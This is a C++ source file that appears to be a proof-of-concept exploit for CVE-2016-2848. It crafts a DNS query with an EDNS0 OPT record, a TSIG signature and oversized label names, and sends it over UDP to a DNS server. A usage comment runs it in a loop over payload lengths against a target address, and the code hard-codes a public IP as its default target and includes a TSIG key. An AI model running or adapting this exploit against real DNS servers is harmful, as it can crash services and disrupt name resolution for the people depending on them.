#include "dns.hpp"
#include "udpv4client.hpp"
#include <algorithm>
#include <arpa/inet.h>
#include <boost/program_options.hpp>
#include <cstring>
#include <iostream>

/*
 * Usage 

$ for len in `seq 700 -1 512 ` ; \
  do timeout 0.1  \
    ./bin/cve-2016-2848 -s 172.16.253.45  -l $len \
      -k uuw482MVXGvz8FmgM4kF/1M2WIfJzp0Hz4FXyfsXDfRoIiufYvrfH+yMkKgTu4xw8EbPR2LGkaLkzEH11tQaYA== \
      -q aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \
      -n aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaa \
      -a aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; \
  done

*/

const char *DNS_SERVER_ADDRESS = "49.212.193.254";

namespace po = boost::program_options;

int main( int argc, char **argv )
{
    std::string target_server = DNS_SERVER_ADDRESS;
    int         length  = 0;
    std::string base64_key, key_name, qname, algorithm;

    po::options_description desc( "EDNS0 Validation Tester" );
    desc.add_options()( "help,h", "print this message" )

        ( "server,s",
          po::value<std::string>( &target_server )->default_value( DNS_SERVER_ADDRESS ),
          "target server address" )

	( "qname,q", po::value<std::string>( &qname )->default_value( "www.siskrn.co" ), "QNAME" )

	( "lenght,l", po::value<int>( &length )->default_value( 512 ), "length" )

	( "key,k", po::value<std::string>( &base64_key )->default_value( "" ), "TSIG Key" )

	( "algorithm,a", po::value<std::string>( &algorithm )->default_value( "HMAC-MD5.SIG-ALG.REG.INT" ), "TSIG Algorithm" )

	( "name,n", po::value<std::string>( &key_name )->default_value( "siskrn.co" ), "TSIG Key Name" );

    po::variables_map vm;
    po::store( po::parse_command_line( argc, argv, desc ), vm );
    po::notify( vm );

    if ( vm.count( "help" ) ) {
        std::cerr << desc << "\n";
        return 1;
    }

    PacketData tsig_key;
    PacketData key;
    tsig_key.resize( decode_from_base64_size( base64_key.c_str(), base64_key.c_str() + base64_key.size() ) );
    decode_from_base64( base64_key.c_str(), base64_key.c_str() + base64_key.size(), &tsig_key[ 0 ] );

    dns::TSIGInfo tsig_info;
    tsig_info.name        = key_name;
    tsig_info.algorithm   = algorithm;
    tsig_info.key         = tsig_key;
    tsig_info.signed_time = time( NULL );
    tsig_info.fudge       = 300;
    tsig_info.original_id = 0x0f01;

    dns::PacketInfo                        packet_info;
    std::vector<dns::QuestionSectionEntry> question_section;
    std::vector<dns::ResourceRecord>       answer_section, authority_section, additional_infomation_section;

    dns::QuestionSectionEntry question;
    question.q_domainname = qname;
    question.q_type       = dns::TYPE_A;
    question.q_class      = dns::CLASS_IN;
    packet_info.question_section.push_back( question );

    std::vector<dns::OptPseudoRROptPtr> options1, options2;
    dns::OptPseudoRecord                opt_pseudo_rr_1, opt_pseudo_rr_2;

    options1.push_back( dns::OptPseudoRROptPtr( new dns::NSIDOption( "" ) ) );
    opt_pseudo_rr_1.payload_size = length;
    opt_pseudo_rr_1.dobit        = true;
    //    opt_pseudo_rr_1.record_options_data =
    //	boost::shared_ptr<dns::RDATA>( new dns::RecordOptionsData( options1 ) );
    packet_info.additional_infomation_section.push_back( dns::generate_opt_pseudo_record( opt_pseudo_rr_1 ) );

    packet_info.id                   = 1234;
    packet_info.opcode               = 0;
    packet_info.query_response       = 0;
    packet_info.authoritative_answer = 0;
    packet_info.truncation           = 0;
    packet_info.recursion_desired    = 0;
    packet_info.recursion_available  = 0;
    packet_info.zero_field           = 0;
    packet_info.authentic_data       = 0;
    packet_info.checking_disabled    = 0;
    packet_info.response_code        = 0;

    WireFormat message;
    dns::generate_dns_packet( packet_info, message );

    dns::addTSIGResourceRecord( tsig_info, message );

    udpv4::ClientParameters udp_param;
    udp_param.destination_address = target_server;
    udp_param.destination_port    = 53;
    udpv4::Client udp( udp_param );
    udp.sendPacket( message );

    udpv4::PacketInfo received_packet = udp.receivePacket();

    dns::PacketInfo res = dns::parse_dns_packet( received_packet.begin(), received_packet.end() );

    std::cout << res;

    return 0;
}
